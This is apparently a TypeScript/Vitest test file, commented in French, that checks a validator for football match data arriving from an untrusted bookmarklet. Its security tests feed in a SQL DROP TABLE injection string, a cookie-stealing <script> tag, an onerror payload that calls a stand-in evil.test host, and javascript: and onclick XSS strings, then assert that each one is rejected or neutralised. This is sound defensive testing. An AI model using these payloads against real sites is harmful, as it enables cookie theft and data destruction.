/**
 * Tests — validateIngestPayload() (src/lib/dofa/ingest-validation.ts, LOT 7)
 *
 * ⚠️ Point le plus sensible du chantier : le payload arrive du navigateur
 * du coach, qui l'a lui-même reçu du site tiers de la FFF (bookmarklet,
 * lot 8). Rien ne garantit qu'il vient réellement de la FFF, ni qu'il n'a
 * pas été altéré en transit ou fabriqué de toutes pièces. Cette fonction
 * est la seule frontière de confiance avant écriture en base : elle doit
 * être PURE (aucune I/O, aucun mock nécessaire pour la tester) et rejeter
 * strictement tout ce qui s'écarte du contrat attendu.
 *
 * Phase "Red" attendue : src/lib/dofa/ingest-validation.ts n'existe pas
 * encore → tous les tests échouent à l'import.
 *
 * Signature attendue (contrat imposé à @dev) :
 *
 *   export const MAX_INGEST_MATCHES = 500;
 *   export const MAX_INGEST_BYTES = 1.5 * 1024 * 1024; // 1,5 Mo
 *
 *   export interface ValidateIngestPayloadInput {
 *     rawBody: string;        // corps brut de la requête HTTP (avant JSON.parse)
 *     triplet: DofaPouleRef;  // { cp_no, phase, poule } déclaré par l'appelant (coach)
 *   }
 *
 *   export type IngestValidationFailureReason =
 *     | "invalid_json"
 *     | "invalid_shape"
 *     | "payload_too_large"
 *     | "too_many_matches"
 *     | "invalid_matches"
 *     | "triplet_mismatch";
 *
 *   export type IngestValidationResult =
 *     | { ok: true; matches: DofaMatch[] }
 *     | { ok: false; reason: IngestValidationFailureReason; message: string };
 *
 *   export function validateIngestPayload(
 *     input: ValidateIngestPayloadInput
 *   ): IngestValidationResult
 *
 * Contrat de validation (dans l'ordre, chaque étape peut court-circuiter) :
 *   1. Taille brute (octets UTF-8 de `rawBody`) > 1,5 Mo → reject "payload_too_large".
 *   2. `JSON.parse(rawBody)` échoue → reject "invalid_json".
 *   3. La valeur parsée n'est ni un tableau, ni une enveloppe Hydra
 *      (`{ "hydra:member": [...] }`) → reject "invalid_shape" (protège
 *      contre un objet fourni là où un tableau est attendu).
 *   4. Nombre d'éléments > 500 → reject "too_many_matches".
 *   5. Réutilise `parseDofaMatches` (lot 2, déjà testé) pour parser les
 *      éléments. Si le nombre de matchs valides retournés diffère du
 *      nombre d'éléments bruts (un item a été silencieusement ignoré par
 *      le parseur car `ma_no` non numérique / `home.club.cl_no` absent /
 *      structure invalide) → reject "invalid_matches". La frontière
 *      d'ingestion NE DOIT PAS accepter silencieusement un sous-ensemble :
 *      c'est au parseur de tolérer, à l'ingestion de refuser en bloc.
 *   6. Chaque match doit avoir une `date` parsable (`Date.parse` non NaN)
 *      → sinon reject "invalid_matches".
 *   7. Tous les matchs doivent appartenir au même triplet que celui
 *      déclaré par l'appelant (`competition.cp_no`, `phase.number`,
 *      `poule.stage_number` du JSON brut, comparés à `input.triplet`)
 *      → sinon reject "triplet_mismatch" (empêche l'injection de matchs
 *      d'une autre poule dans le championnat suivi).
 *   8. `short_name` (home/away) et `terrain.name` sont neutralisés :
 *      aucune balise HTML, aucun `<script>`, aucun attribut `onerror=`,
 *      aucun schéma `javascript:` ne doit survivre dans les valeurs
 *      retournées.
 *   9. Seuls les champs connus de `DofaMatch` sont retournés — toute clé
 *      inconnue du payload brut (ex. `__proto__`, `sql`, `admin`) est
 *      ignorée, jamais transmise vers l'appelant / la DB.
 *
 * Hors-scope explicite (cf. TODO lot 7) : pas de test de performance, pas
 * de fuzzing.
 */

import { describe, it, expect } from "vitest";
import fixtureRaw from "@/lib/dofa/__fixtures__/resultat-d4-pouleD.json";
import { validateIngestPayload } from "@/lib/dofa/ingest-validation";
import type { DofaPouleRef } from "@/lib/dofa/types";

const REAL_TRIPLET: DofaPouleRef = { cp_no: 457587, phase: 1, poule: 4 };

function clone<T>(value: T): T {
  return JSON.parse(JSON.stringify(value));
}

function makeMatch(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  const base = clone(fixtureRaw[0]) as Record<string, unknown>;
  return { ...base, ...overrides };
}

/**
 * Construit un match au format allégé (bookmarklet, lot 8) — seuls les
 * champs exploités par `parseDofaMatches` + le triplet cp_no/phase/poule
 * (nécessaire au contrôle anti-injection de poule) sont présents. Utilisé
 * pour le test "exactement 500 matchs" : cloner la fixture complète pour
 * 500 matchs dépasserait `MAX_INGEST_BYTES`, alors que les deux limites
 * (500 matchs, 1,5 Mo) doivent rester atteignables simultanément grâce au
 * format allégé.
 */
function makeSlimMatch(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  const base: Record<string, unknown> = {
    ma_no: 90000000,
    competition: { cp_no: REAL_TRIPLET.cp_no },
    phase: { number: REAL_TRIPLET.phase },
    poule: { stage_number: REAL_TRIPLET.poule },
    poule_journee: { number: 1 },
    home: { club: { cl_no: 206181 }, number: 6, short_name: "PEVELE FC" },
    away: { club: { cl_no: 918 }, number: 2, short_name: "BOUSBECQUE CS" },
    terrain: {
      name: "COMPLEXE SPORTIF LÉON DALLE 1",
      address: "23 BIS RUE DE LINSELLES",
      zip_code: "59166",
      city: "BOUSBECQUE",
    },
    status: "A",
    date: "2026-09-06T00:00:00+00:00",
    time: "13H00",
    home_score: null,
    home_is_forfeit: "N",
    away_score: null,
    away_is_forfeit: "N",
    seems_postponed: "",
  };
  return { ...base, ...overrides };
}

describe("validateIngestPayload — nominal", () => {
  it("accepte intégralement la fixture réelle (3 matchs, triplet cp_no=457587/phase=1/poule=4)", () => {
    const result = validateIngestPayload({
      rawBody: JSON.stringify(fixtureRaw),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok, `attendu ok=true, reçu: ${JSON.stringify(result)}`).toBe(true);
    if (result.ok) {
      expect(result.matches).toHaveLength(3);
      expect(result.matches.map((m) => m.maNo).sort()).toEqual([56363596, 56363599, 56363601]);
    }
  });
});

describe("validateIngestPayload — limitation de volume (garde-fou anti-DoS)", () => {
  it("rejette un payload de plus de 500 matchs", () => {
    const many = Array.from({ length: 501 }, (_, i) =>
      makeMatch({ ma_no: 90000000 + i })
    );

    const result = validateIngestPayload({
      rawBody: JSON.stringify(many),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("too_many_matches");
  });

  it("accepte exactement 500 matchs (limite incluse, format allégé)", () => {
    const exactly500 = Array.from({ length: 500 }, (_, i) =>
      makeSlimMatch({ ma_no: 90000000 + i })
    );

    const result = validateIngestPayload({
      rawBody: JSON.stringify(exactly500),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok, `attendu ok=true à la limite de 500, reçu: ${JSON.stringify(result).slice(0, 200)}`).toBe(true);
  });

  it("rejette un payload dont la taille brute dépasse 1,5 Mo, même avec peu de matchs", () => {
    const paddedMatch = makeMatch({ short_name_padding: "x".repeat(1600 * 1024) });
    const rawBody = JSON.stringify([paddedMatch]);
    expect(Buffer.byteLength(rawBody, "utf8")).toBeGreaterThan(1.5 * 1024 * 1024);

    const result = validateIngestPayload({ rawBody, triplet: REAL_TRIPLET });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("payload_too_large");
  });
});

describe("validateIngestPayload — rejet strict des malformations", () => {
  it("rejette si le JSON brut est invalide (pas parsable)", () => {
    const result = validateIngestPayload({
      rawBody: "{ceci n'est pas du json valide",
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("invalid_json");
  });

  it("rejette si le payload est un objet là où un tableau de matchs est attendu", () => {
    const result = validateIngestPayload({
      rawBody: JSON.stringify({ foo: "bar" }),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("invalid_shape");
  });

  it("rejette en bloc si un `ma_no` n'est pas numérique", () => {
    const bad = [makeMatch(), makeMatch({ ma_no: "not-a-number" })];

    const result = validateIngestPayload({
      rawBody: JSON.stringify(bad),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok, "un ma_no non numérique doit invalider tout le lot, pas juste l'item").toBe(false);
    if (!result.ok) expect(result.reason).toBe("invalid_matches");
  });

  it("rejette en bloc si `home.club.cl_no` est absent", () => {
    const broken = makeMatch();
    delete (broken.home as Record<string, unknown>).club;

    const result = validateIngestPayload({
      rawBody: JSON.stringify([broken]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("invalid_matches");
  });

  it("rejette en bloc si `date` n'est pas parsable", () => {
    const broken = makeMatch({ date: "pas-une-date" });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([broken]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("invalid_matches");
  });
});

describe("validateIngestPayload — clés inconnues jamais transmises (anti-injection de colonne)", () => {
  it("ignore toute clé non prévue du schéma (aucun pass-through vers la sortie)", () => {
    const withExtraKeys = makeMatch({
      sql_injection: "'; DROP TABLE championship_standings; --",
      admin: true,
      team_id: "attacker-controlled-team-id",
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([withExtraKeys]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const serialized = JSON.stringify(result.matches);
      expect(serialized).not.toMatch(/DROP TABLE/i);
      expect(serialized).not.toMatch(/sql_injection/i);
      expect(serialized).not.toMatch(/attacker-controlled-team-id/i);
      expect(serialized).not.toMatch(/"admin"/i);
    }
  });
});

describe("validateIngestPayload — CAS LIMITE SÉCURITÉ : neutralisation HTML/script", () => {
  it("neutralise une balise <script> injectée dans short_name", () => {
    const evil = makeMatch({
      home: {
        ...(makeMatch().home as Record<string, unknown>),
        short_name: "<script>alert(document.cookie)</script>",
      },
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([evil]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const shortName = result.matches[0].homeTeam.shortName;
      expect(shortName, `short_name neutralisé attendu, reçu: ${shortName}`).not.toMatch(/<script/i);
      expect(shortName).not.toContain("<script>");
    }
  });

  it("neutralise un attribut onerror injecté dans short_name", () => {
    const evil = makeMatch({
      home: {
        ...(makeMatch().home as Record<string, unknown>),
        short_name: '<img src=x onerror="fetch(\'https://evil.test/steal\')">',
      },
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([evil]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const shortName = result.matches[0].homeTeam.shortName;
      expect(shortName).not.toMatch(/onerror\s*=/i);
      expect(shortName).not.toMatch(/<img/i);
    }
  });

  it("neutralise un schéma javascript: injecté dans terrain.name", () => {
    const evil = makeMatch({
      terrain: {
        ...(makeMatch().terrain as Record<string, unknown>),
        name: "javascript:alert(1)",
      },
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([evil]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const locationName = result.matches[0].location?.name ?? "";
      expect(locationName).not.toMatch(/javascript:/i);
    }
  });

  it("neutralise du HTML balisé (non-<script>) dans terrain.name sans le laisser interprétable", () => {
    const evil = makeMatch({
      terrain: {
        ...(makeMatch().terrain as Record<string, unknown>),
        name: '<b onclick="alert(1)">Stade</b>',
      },
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([evil]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      const locationName = result.matches[0].location?.name ?? "";
      expect(locationName).not.toMatch(/<b\b/i);
      expect(locationName).not.toMatch(/onclick\s*=/i);
    }
  });
});

describe("validateIngestPayload — cohérence du triplet (anti-injection d'une autre poule)", () => {
  it("rejette globalement si un match du lot appartient à un autre triplet (cp_no différent)", () => {
    const foreign = makeMatch({
      competition: { ...(makeMatch().competition as Record<string, unknown>), cp_no: 999999 },
    });
    const mixed = [makeMatch(), foreign];

    const result = validateIngestPayload({
      rawBody: JSON.stringify(mixed),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok, "un seul match hors triplet doit invalider tout le lot").toBe(false);
    if (!result.ok) expect(result.reason).toBe("triplet_mismatch");
  });

  it("rejette globalement si un match appartient à une autre poule (stage_number différent)", () => {
    const foreign = makeMatch({
      poule: { ...(makeMatch().poule as Record<string, unknown>), stage_number: 7 },
    });

    const result = validateIngestPayload({
      rawBody: JSON.stringify([makeMatch(), foreign]),
      triplet: REAL_TRIPLET,
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("triplet_mismatch");
  });

  it("rejette si le triplet déclaré par l'appelant ne correspond à aucun match du lot", () => {
    const result = validateIngestPayload({
      rawBody: JSON.stringify(fixtureRaw),
      triplet: { cp_no: 111111, phase: 9, poule: 9 },
    });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("triplet_mismatch");
  });
});
